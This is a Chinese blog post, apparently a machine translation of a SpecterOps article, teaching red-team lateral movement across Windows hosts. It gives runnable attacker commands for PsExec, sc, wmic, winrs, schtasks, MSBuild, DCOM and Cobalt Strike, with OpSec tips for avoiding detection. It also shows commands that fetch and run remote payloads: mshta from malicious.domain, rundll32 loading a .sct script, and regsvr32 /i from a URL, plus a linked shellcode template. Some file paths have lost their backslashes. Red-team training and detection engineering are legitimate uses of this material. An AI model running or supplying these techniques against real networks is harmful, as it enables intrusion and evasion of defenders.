> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/p0LYvu2YZ5S5Qh9H5bjkrw)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDibK5icGCKgSJU9hIW86ibbYfClS95D3HwqeyE69HiaHj0jHIDCfjZkeCjrxJyI3ib1Nr4WTTsCOh1XxQ/640?wx_fmt=png)

前言

近期看了一篇不错的横向移动的文章，觉得不错就简单翻译了一下 (谷歌翻译哈哈哈哈！)  
原文地址：https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f

OFFENSIVE LATERAL MOVEMENT(横向移动)

横向移动是从一个受感染主机迁移到另一个受感染主机的过程。渗透测试人员和红队通过通过执行 powershell.exe 在远程主机上面运行经过 base64 编码的命令来完成横向移动，然后返回到目标的会话。这样做的问题在于，Powershell 用来横向移动已经不是一个新的技术了，即使是成熟的安全厂商和蓝队都能对这种横向移动技术进行检测并且迅速的拦截，任何一种不错 AV 产品都可以将恶意命令执行之前给拦截。横向移动的困难在于具有良好的操作安全性（OpSec），这意味着尽量少生成一些日志，或者生成的日志看上去是正常的，难以被防守方和和蓝队发现。目的不仅是展示技术，但要显示幕后情况以及与之相关的任何指标。我将在整个文章中引用一些 Cobalt Strike 语法，因为这是我们主要用于 C2 的语法，但是 Cobalt Strike 的内置横向移动技术是相当嘈杂，对 OpSec 不友好。另外，我了解并非每个人都有 Cobalt Strike,，因此在大多数示例中也引用了 Meterpreter，但是这些技术是通用的。

这里有几种不同的横向移动技术，将尝试从较高的角度介绍大型横向运动机器工作原理，但是在介绍这些技术之前，我先介绍一些技术词汇。

Named Pipe(命名管道): 命名管道是一种通过 SMB（TCP 445）相互通信的一种方式，它工作在 OSI 模型的第五层，类似于端口可以监听链接的方式，命名管道也可以监听请求

Access Token(访问令牌): 根据 Microsoft 的文档：访问令牌是一个对象，它描述进程或线程的安全上下文。令牌中的信息包括与进程或线程关联的用户帐户的标识和特权。当用户登录时，系统通过将用户密码与安全数据库中存储的信息进行比较来验证用户密码。验证用户的凭证后，系统将生成访问令牌。代表该用户执行的每个进程都有此访问令牌的副本。

换句话说，它包含您的身份并说明您可以在系统上使用或不能使用的功能。在不深入研究 Windows 身份验证的情况下，访问令牌会参考登录会话，这是用户登录 Windows 时创建的登录会话。

Network Logon (Type 3): 当帐户对远程系统 / 服务进行身份验证时，将发生网络登录。在网络身份验证期间，可重用凭据不会发送到远程系统。因此，当用户通过网络登录登录到远程系统时，该用户的凭据将不会出现在远程系统上以执行进一步的身份验证。这带来了双跳问题，这意味着如果我们有一个单线通过网络登录连接到一个目标，然后又通过 SMB 到达，则不存在通过 SMB 登录的凭据，因此登录失败。示例在下面进一步显示。

PsExec

PsExec 来自 Microsoft 的 Sysinternals 套件，允许用户使用命名管道通过端口 445（SMB）在远程主机上执行 Powershell。它首先通过 SMB 连接到目标上的 ADMIN$ 共享，上载 PSEXESVC.exe 并使用 Service Control Manager 启动. exe，后者在远程系统上创建一个命名管道，最后将该管道用于 I / O。  
语法示例如下：

psexec \\test.domain -u Domain\User -p Password ipconfig

Cobalt Strike (CS) 的处理方式略有不同，它首先创建一个 Powershell 的脚本，该脚本对内存中运行的嵌入式的 payloads 进行一个 base64 的编码，并将其压缩为单行代码，连接到 ADMIN$ 或者是 C$ share 并且运行 Powershell 命令。  
问题是它会创建服务并运行 base64 编码的命令，这是不正常的，并且会引发各种警报并生成日志。 另外，发送的命令是通过命名管道发送的，该管道在 CS 中具有默认名称（可以更改）。 Red Canary 撰写了一篇有关检测它的出色文章。  
Cobalt Strike 有两个内置的 PsExec，一个称为 PsExec，另一个称为 PsExec（psh）。两者之间的区别，尽管 CS 文档有说明，PsExec（psh）仍在调用 Powershell.exe，并且您的信标将作为 Powershell.exe 进程运行，而没有（psh）的 PsExec 将作为 rundll32.exe 运行。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDibK5icGCKgSJU9hIW86ibbYf20ydeJyXVXSs9Mj4bJvDbVYp1U0RaVMWohszCskF952YfvwboB0wCg/640?wx_fmt=png)

默认情况下，PsExec 将生成 rundll32.exe 进程以从中运行。它不会将 DLL 拖放到磁盘或任何东西上，因此从蓝队的角度来看，如果 rundll32.exe 在没有参数的情况下运行，则非常可疑。

SC

服务控制器确实听起来像它 - 它控制服务。这对于攻击者特别有用，因为可以通过 SMB 安排任务，因此启动远程服务的语法为：

sc \\host.domain create ExampleService binpath= “c:\windows\system32\calc.exe”

sc \\host.domain start ExampleService

唯一需要注意的是，可执行文件必须特别是服务二进制文件。服务二进制文件的不同之处在于它们必须 “签入” 服务控制管理器（SCM），如果没有，则将退出执行。因此，如果为此使用非服务二进制文件，则它将作为 agent/beacon 再次出现，然后 die。

在 CS 中，您可以专门制作服务可执行文件：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDibK5icGCKgSJU9hIW86ibbYfLr5O62ic6g9PWssR0lCTRgia1TgNhUfPMmmgJFich3NsrSVCqPXUg3azg/640?wx_fmt=png)

WMI

Windows 内置 Windows Management Instrumentation（WMI），以允许通过 WMI 服务远程访问 Windows 组件。通过使用端口 135 上的远程过程调用（RPC）进行通信以进行远程访问（以及以后的临时端口），它允许系统管理员远程执行自动管理任务，例如远程启动服务或执行命令。它可以通过 wmic.exe 直接进行交互。 WMI 查询示例如下所示：

wmic /node:target.domain /user:domain\user /password:password process call create "C:\Windows\System32\calc.exe”

Cobalt Strike 利用 WMI 在目标上执行 Powershell 的 payload，因此使用内置 WMI 时 PowerShell.exe 将打开，这是 OpSec 问题，因为执行的是 base64 编码的负载。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDibK5icGCKgSJU9hIW86ibbYfT7dNhmaTj918bbibvMxjdPwjnZAAibB81gaahtuyYjzp4gddiatpzRU8w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDibK5icGCKgSJU9hIW86ibbYfdyszaCDQE1yazC3PicHIW8SQ53ImU9DpKGNGUaia8zf6H8ibNgBLAX8Mg/640?wx_fmt=png)

因此，我们看到即使通过 WMI，尽管 wmic.exe 能够通过 PowerShell 在目标上运行命令，但仍创建了命名管道，那么为什么要首先创建命名管道呢？命名管道不是执行有效负载所必需的，但是有效负载 CS 会使用命名管道进行通信（通过 SMB）。

WinRM

Windows Remote Management allows management (WinRM) 运行管理服务器硬件，这也是 Microsoft 通过 HTTP(S) 使用 WMI 的方式。不同于传统的一个 WEB 浏览，它不是使用 80/443，而是使用 5985（HTTP）和 5986（HTTPS）来代替它们。WinRM 默认情况下随 Windows 一起安装，但需要进行一些设置才能使用。这是服务器操作系统的例外，因为自 2012R2 及更高版本开始默认启用。 WinRM 需要客户端上的侦听器（听起来熟悉吗？），即使启动了 WinRM 服务，也必须存在一个侦听器，以便其处理请求。这可以通过 Powershell 中的命令完成，也可以通过 WMI 和 Powershell 远程完成：

Enable-PSRemoting -Force

从非 CS 的角度来看（用您的二进制文件替换 calc.exe）：

winrs -r:EXAMPLE.lab.local -u:DOMAIN\user -p:password calc.exe

Executing with CobaltStrike:

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDibK5icGCKgSJU9hIW86ibbYfhPaMlBAY6aJibpKLWEZRyYOicI5BWiaVOZDtpf0O9icrTrwRiaWkYqc8WkA/640?wx_fmt=png)

当然，这样做的问题是必须使用 PowerShell 启动它。如果您是远程用户，则需要通过 DCOM 或 WMI 完成。虽然打开 PowerShell 并不奇怪，并且启动 WinRM 侦听器可能会在雷达下飞来飞去，但执行有效负载时会出现嘈杂的部分，因为运行 Cobalt Strike 内置的 WinRM 模块时会有一个指示器。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDibK5icGCKgSJU9hIW86ibbYfYL7XXZN71CxZdH1Q1ZzicemDMwJ1F3gZov5ibtVzBqAsu7kDwkVVGYicw/640?wx_fmt=png)

SchTasks

SchTasks 是 “计划任务” 的缩写，它最初在端口 135 上运行，然后使用 DCE / RPC 进行通信，继续通过临时端口进行通信。与在 Linux 中创建 cron-job 相似，您可以安排任务发生并执行所需的任何操作。

schtasks /create /tn ExampleTask /tr c:\windows\system32\calc.exe /sc once /st 00:00 /S host.domain /RU System

schtasks /run /tn ExampleTask /S host.domain

schtasks /F /delete /tn ExampleTask /S host.domain

In CobaltStrike:

shell schtasks /create /tn ExampleTask /tr c:\windows\system32\calc.exe /sc once /st 00:00  /S host.domain /RU System

shell schtasks /run /tn ExampleTask /S host.domain

Then delete the job (opsec!)

shell schtasks /F /delete /tn ExampleTask /S host.domain

MSBuild

虽然不是横向移动技术，但 Casey Smith 在 2016 年发现，可以将 MSBuild.exe 与上述某些方法结合使用，以避免丢弃已编码的 Powershell 命令或生成 cmd.exe。MSBuild.exe 是一个 Microsoft 签名的可执行文件，已随. NET Framework 软件包一起安装。MSBuild 用于通过提供架构的 XML 文件来 compile/build C# applications。从攻击者的角度来看，这用于编译 C＃代码以生成恶意的二进制文件或有效负载，甚至直接从 XML 文件运行有效负载。MSBuild 也可以通过 SMB 进行编译，如下语法所示。

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe \\host.domain\path\to\XMLfile.xml

当然可以是已经通过建立会话链接，然后把远程通过 WMI 来用 MSBuild 来远程编程 C# 的 XMLfile.xml

wmic /node:LADWIN.lab.local /user:LAB\administrator /password:Password!

process call create "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Windows\XMLfile.xml"

XML Template:

https://gist.githubusercontent.com/ConsciousHacker/5fce0343f29085cd9fba466974e43f17/raw/df62c7256701d486fcd1e063487f24b599658a7b/shellcode.xml

What doesn’t work:

wmic /node:LABWIN10.lab.local /user:LAB\Administrator /password:Password! process call create "c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe \\LAB2012DC01.LAB.local\C$\Windows\Temp\build.xml"

由于双跳问题，尝试使用 wmic 调用 msbuild.exe 通过 SMB 构建 XML 将会失败。当发生网络登录（类型 3）时，会出现双跳问题，这意味着凭据实际上从未发送到远程主机。由于凭据没有发送到远程主机，因此远程主机无法向有效负载托管服务器进行身份验证。在 Cobalt Strike 中，使用 wmic 时通常会遇到这种情况，解决方法是为该用户创建令牌，因此可以从该主机传递凭据。但是，如果没有 CS，则有一些解决方法：

在本地托管 XML 文件（放置到磁盘）

copy C:UsersAdministratorDownloadsbuild.xml \LABWIN10.lab.localC$WindowsTemp\

wmic /node:LABWIN10.lab.local /user:LABAdministrator /password:Password! process call create "c:windowsMicrosoft.NETFrameworkv4.0.30319Msbuild.exe C:WindowsTempbuild.xml"

通过 WebDAV 托管 XML(远程服务器托管)

使用 PsExec

psexec \host.domain -u DomainTester -p Passw0rd c:windowsMicrosoft.NETFrameworkv4.0.30319Msbuild.exe \host.domainC$WindowsTempbuild.xml"

在 Cobalt Strike 中，有一个 Aggressor Script 扩展程序，该扩展程序使用 MSBuild 执行 Powershell 命令，而不会通过不受管进程（二进制直接编译成机器代码）而生成 Powershell。这是通过 WMI / wmic.exe 上传的。

https://github.com/Mr-Un1k0d3r/PowerLessShell

MSBuild 的关键指标是它正在通过 SMB 执行，并且 MSBuild 正在建立出站连接。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDibK5icGCKgSJU9hIW86ibbYfrIqpibqT1fjQPAygOuFkhfc7GWiadhZOGCiaURJleu9ZfAVGYyhZyeoow/640?wx_fmt=png)

DCOM

组件对象模型（COM）是具有不同应用程序和语言的进程使用的一种协议，因此它们彼此通信。 COM 对象不能在引入了分布式 COM（DCOM）协议的网络上使用。我出色的同事 Matt Nelson 通过 Microsoft 管理控制台（MMC）2.0 脚本对象模型中的 ExecuteShellCommand 方法，通过 DCOM 发现了一种横向移动技术，该方法用于系统管理服务器的管理功能。

可以通过以下方式调用

[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.10.30")).Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\Calc.exe","0","0","0")

DCOM 使用 network-logon (type 3),o 这里还会遇到双跳问题。 PsExec 消除了双跳问题，因为与命令一起传递了凭据并生成了交互式登录会话（类型 2），但是问题是 ExecuteShellCommand 方法仅允许四个参数，因此如果传递的参数少于或大于四个进入，它出错了。另外，空格必须是它们自己的参数（例如，“ cmd.exe”，$ null，“ / c” 是三个参数），这消除了将带有 DCOM 的 PsExec 与执行 MSBuild 的可能性。从这里开始，有一些选择。

使用 WebDAV

将 XML 文件托管在不需要身份验证的 SMB 共享上（例如，使用 Impacket 的 SMBServer.py，但很可能要求攻击者在网络上拥有攻击机器）

尝试其他类似的 “ExecuteShellCommand” 方法

使用 WebDAV，它仍然使用 UNC 路径，但是如果 Windows 无法通过 445 和 139 到达路径，则 Windows 最终将退回到端口 80。使用 WebDAV，SSL 也是一个选择。唯一需要注意的是，WebDAV 在服务器上不起作用，因为默认情况下该服务在服务器操作系统上不存在。

[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.10.30")).Document.ActiveView.ExecuteShellCommand("c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe",$null,"\\192.168.10.131\webdav\build.xml","7")

通过不需要任何身份验证即可访问 WebDAV 服务器（在本例中也是 C2 服务器），从而解决了双跳问题。  
此方法的问题在于它产生了两个进程：mmc.exe，因为从 MMC2.0 和 MSBuild.exe 调用了 DCOM 方法。  
另外，这确实会临时写入磁盘。 Webdav 写道

C\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\TfsStore\Tfs_DAV

并且在执行后不会清除任何文件。 MSBuild 临时写入

C\ Users\[USER]\AppData\Local\Temp\[RANDOM]\

并会自行清理。巧妙的方法是，由于 MSBuild 使用 Webdav，因此 MSbuild 会清理 Webdav 创建的文件。  
本文还介绍了其他执行 DCOM 方法和防御建议。

https://www.cybereason.com/blog/dcom-lateral-movement-techniques

Remote File Upload

不一定是横向移动技术，值得注意的是，您可以生成自己的二进制文件，而不是使用 Cobalt Strikes 内置插件（可能更隐秘）。这是通过对目标 C $ 共享具有 SMB 的上载特权（即管理权限）来实现的，然后您可以将其无阶段的二进制文件上载到并通过 wmic 或 DCOM 执行。  
请注意，beacon 没有 “check in”。需要通过命令手动完成

link target.domain

不使用 CS:

copy C:\Windows\Temp\Malice.exe \\target.domain\C$\Windows\Temp

wmic /node:target.domain /user:domain\user /password:password process call create "C:\Windows\Temp\Malice.exe”

Other Code Execution Options

还有更多可能的代码执行选项，它们需要本地执行而不是远程执行，因此像 MSBuild 一样，这些必须与横向移动技术配合使用。

Mshta

Mshta.exe 是 Windows 上默认安装的可执行文件，它允许执行. hta 文件。 .hta 文件是 Microsoft HTML 应用程序文件，允许在 HTML 应用程序中执行 Visual Basic 脚本。关于 Mshta 的好处是，它允许通过 URL 执行，并且由于它是受信任的 Microsoft 可执行文件，因此应绕过默认的应用白名单。

mshta.exe https://malicious.domain/runme.hta

Rundll32

这是相对众所周知的。 Rundll32.exe 再次是受信任的 Windows 二进制文件，用于执行 DLL 文件。可以通过 UNC WebDAV 路径甚至通过 JavaScript 来指定 DLL。

rundll32.exe javascript:"..\mshtml,RunHTMLApplication";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"

由于它正在运行 DLL，因此您可以将其与其他一些 DLL 结合使用，以实现不同的技术：

URL.dll: 可以运行. url（快捷方式）文件；也可以运行. hta 文件

rundll32.exe url.dll,OpenURL "C:\Windows\Temp\test.hta"

ieframe.dll: 可以运行. url 文件

[InternetShortcut]

URL=file:///c:\windows\system32\cmd.exe

Regsvr32  
注册服务器用于为注册表注册和注销 DLL。 Regsrv32.exe 是经过签名的 Microsoft 二进制文件，可以接受 URL 作为参数。具体来说，它将运行一个. sct 文件，该文件是一个 XML 文档，允许注册 COM 对象。

regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/nzxUaDY8yDCu9vYaicsKXmibIlxHDeXmK8yoDsVrSMpI3RgS4JPtgGPdqXToibeNYGEMgk5WznIayx4hwMd8sVgJA/640?wx_fmt=jpeg)